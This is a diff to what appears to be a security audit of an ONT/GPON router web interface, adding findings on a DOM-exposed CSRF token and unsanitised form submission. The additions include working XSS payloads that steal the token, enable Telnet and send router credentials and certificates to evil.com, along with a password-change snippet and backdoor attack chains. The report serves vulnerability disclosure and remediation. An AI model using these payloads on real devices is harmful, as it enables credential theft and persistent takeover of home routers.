@@ -45,7 +45,9 @@
 28. [V-28: RequestFile Parameter Injection in CGI Endpoints](#v-28-requestfile-parameter-injection-in-cgi-endpoints)
 29. [V-29: MEGACABLE2 → PLDT CfgMode Switch via FrameModeSwitch.cgi](#v-29-megacable2--pldt-cfgmode-switch-via-framemodeswitchcgi)
 30. [V-30: MEGACABLE2 randcode / Challenge Code Leak](#v-30-megacable2-randcode--challenge-code-leak)
-31. [Potential Privilege Escalation Paths](#potential-privilege-escalation-paths)
+31. [V-31: onttoken DOM Element Exposes CSRF Token to XSS](#v-31-onttoken-dom-element-exposes-csrf-token-to-xss)
+32. [V-32: Form Submission Chain Without Input Sanitization](#v-32-form-submission-chain-without-input-sanitization)
+33. [Potential Privilege Escalation Paths](#potential-privilege-escalation-paths)
 
 ---
 
@@ -2004,6 +2006,179 @@ Beyond V-10 (general variable leakage), MEGACABLE2 specifically exposes:
   someone else has been trying to log in
 - Combined with V-29 (CfgMode switch to TOT), the exposed randcode bypasses
   the TOT CheckCode requirement
+
+---
+
+## V-31: onttoken DOM Element Exposes CSRF Token to XSS
+
+**Severity**: HIGH  
+**File**: `util.js` line 1596, `safelogin.js` line 53  
+**Type**: Token leakage via DOM / XSS-to-CSRF escalation
+
+### Description
+
+The anti-CSRF token (`X_HW_Token`) is stored in a hidden HTML element with
+`id="onttoken"` in every admin page.  The generic `Submit()` function reads
+it from the DOM:
+
+```javascript
+// util.js line 1596
+Form.addParameter('x.X_HW_Token', getValue('onttoken'));
+
+// safelogin.js line 53
+Form.addParameter('x.X_HW_Token', getValue('onttoken'));
+```
+
+The `getValue()` function (util.js line 1208) simply returns `element.value`:
+```javascript
+function getValue(id) {
+    var element = getElement(id);
+    if (element == null) return -1;
+    return element.value;  // No access control
+}
+```
+
+### Attack — XSS to Full CSRF
+
+If an attacker achieves DOM-based XSS (via V-24 `SetDivValue` or
+`setObjNoEncodeInnerHtmlValue`), they can read the anti-CSRF token directly:
+
+```javascript
+// Injected via XSS:
+var token = document.getElementById('onttoken').value;
+// Now perform any authenticated action:
+fetch('/setajax.cgi?InternetGatewayDevice.X_HW_CLITelnetAccess.', {
+    method: 'POST',
+    body: 'Enable=1&LanEnable=1&x.X_HW_Token=' + token
+});
+```
+
+### Attack — Extract All Credentials via XSS
+
+Combined with V-25 (TR-069 sensitive paths), a single XSS payload can
+extract every password and certificate from the router:
+
+```javascript
+// Injected via XSS — exfiltrate all credentials
+var token = document.getElementById('onttoken').value;
+var paths = [
+    'InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.2.',
+    'InternetGatewayDevice.ManagementServer.',
+    'InternetGatewayDevice.X_HW_Security.Certificate.1.',
+    'InternetGatewayDevice.DeviceInfo.X_HW_OMCI.',
+];
+paths.forEach(function(p) {
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', '/getajax.cgi?' + p, false);
+    xhr.send('x.X_HW_Token=' + token);
+    new Image().src = 'http://evil.com/steal?path=' + p +
+                      '&data=' + encodeURIComponent(xhr.responseText);
+});
+```
+
+### Impact
+
+- Any XSS vulnerability becomes a **full admin compromise**
+- Token is readable from DOM by any JavaScript on the page
+- Combined with V-24 + V-25: XSS → token theft → credential/cert extraction
+- Combined with V-26: XSS → token theft → arbitrary config write
+- The `onttoken` element exists on **every authenticated page**
+
+---
+
+## V-32: Form Submission Chain Without Input Sanitization
+
+**Severity**: HIGH  
+**File**: `util.js` lines 1208, 1471-1486, 1500-1503, 1596  
+**Type**: Parameter injection / command injection
+
+### Description
+
+The entire form submission chain — from user input to HTTP POST — has
+**zero input sanitization**:
+
+```
+User Input → getValue() → addParameter() → submit() → HTTP POST
+```
+
+**Step 1 — `getValue()` (line 1208)**: Returns raw `element.value`
+```javascript
+function getValue(id) {
+    var element = getElement(id);
+    if (element == null) return -1;
+    return element.value;  // No encoding, no validation
+}
+```
+
+**Step 2 — `addParameter()` (line 1471)**: Stores raw value in hidden input
+```javascript
+var addParameter = function(sName, sValue) {
+    // ...
+    var ele = this.createNewFormElement(domainName, sValue);
+    this.oForm.appendChild(ele);  // Raw value into form
+};
+```
+
+**Step 3 — `createNewFormElement()` (line 1418)**: Creates hidden input
+```javascript
+var createNewFormElement = function(sName, sValue) {
+    var ele = document.createElement('INPUT');
+    ele.type = 'hidden';
+    ele.name = sName;   // No name validation
+    ele.value = sValue;  // No value validation
+    return ele;
+};
+```
+
+**Step 4 — `submit()` (line 1500)**: POST form with all raw values
+```javascript
+var submit = function(sURL, sMethod) {
+    if (this.status == true) this.oForm.submit();  // No final validation
+};
+```
+
+### Attack — TR-069 Parameter Injection
+
+Since `addParameter()` accepts any name/value pair, and CGI endpoints
+interpret parameter names as TR-069 object paths, an attacker can inject
+additional parameters:
+
+```javascript
+// From browser console:
+var Form = new webSubmitForm();
+// Inject admin password change alongside a legitimate parameter:
+Form.addParameter('z.Password', 'hacked');
+Form.addParameter('x.X_HW_Token', GetToken());
+Form.setAction('/setajax.cgi?InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.2.');
+Form.submit();
+```
+
+### Attack — Newline/Header Injection in Cookie
+
+The cookie setting on login (index.asp line 518) concatenates the `Language`
+variable without sanitization:
+
+```javascript
+var cookie2 = "Cookie=body:" + "Language:" + Language + ":" + "id=-1;path=/";
+document.cookie = cookie2;
+```
+
+If `Language` is manipulated to contain `;` or newlines, additional cookie
+attributes or even new cookies can be injected.
+
+### Impact
+
+- **No input validation anywhere** in the form submission pipeline
+- TR-069 parameter injection allows writing arbitrary config values
+- Cookie header injection via Language parameter manipulation
+- Combined with V-19 (Userlevel): manipulate form action + inject params
+- The `addForm()` and `addDiv()` methods (lines 1422-1470) also iterate
+  DOM elements and submit their values **without sanitization**
+
+---
+
+```
+1. GET /index.asp → extract errloginlockNum, defaultUsername
 2. POST /html/ssmp/common/getRandString.asp → get pre-login token
 3. POST /asp/CheckPwdNotLogin.asp → brute-force password (no lockout?)
 4. POST /login.cgi with discovered password → admin session
@@ -2156,6 +2331,28 @@ Beyond V-10 (general variable leakage), MEGACABLE2 specifically exposes:
 4. POST /login.cgi with UserName=admin&PassWord= → admin session
 ```
 
+### Path 17: XSS → onttoken Theft → Full Credential Extraction
+
+```
+1. Inject XSS via SetDivValue or config value stored in TR-069
+2. var token = document.getElementById('onttoken').value;
+3. POST /getajax.cgi?InternetGatewayDevice. with stolen token
+4. Extract ALL passwords, certificates, private keys, GPON params
+5. Exfiltrate to attacker server via Image().src
+```
+
+### Path 18: XSS → Config Write → Persistent Backdoor
+
+```
+1. Inject XSS via innerHTML (V-24)
+2. Read onttoken from DOM (V-31)
+3. POST /setajax.cgi?InternetGatewayDevice.X_HW_CLITelnetAccess.
+   Body: Enable=1&LanEnable=1&x.X_HW_Token=<stolen_token>
+4. POST /setajax.cgi?InternetGatewayDevice.X_HW_Security.AclServices.
+   Body: HttpEnable=1&HttpWanPort=8080&x.X_HW_Token=<stolen_token>
+5. Telnet enabled + WAN management open = persistent remote access
+```
+
 ---
 
 ## Recommendations
@@ -2184,3 +2381,5 @@ Beyond V-10 (general variable leakage), MEGACABLE2 specifically exposes:
 22. **Require authentication for `FrameModeSwitch.cgi`** — CfgMode changes must not be unauthenticated
 23. **Do not embed `randcode` in HTML** — generate challenge codes server-side per-request, validate server-side
 24. **Lock CfgMode at provisioning time** — prevent ISP mode switching after initial deployment
+25. **Store CSRF token in JavaScript closure, not DOM** — prevent XSS-to-CSRF escalation via `onttoken`
+26. **Sanitize all form inputs** — validate and encode `getValue()` results before `addParameter()`
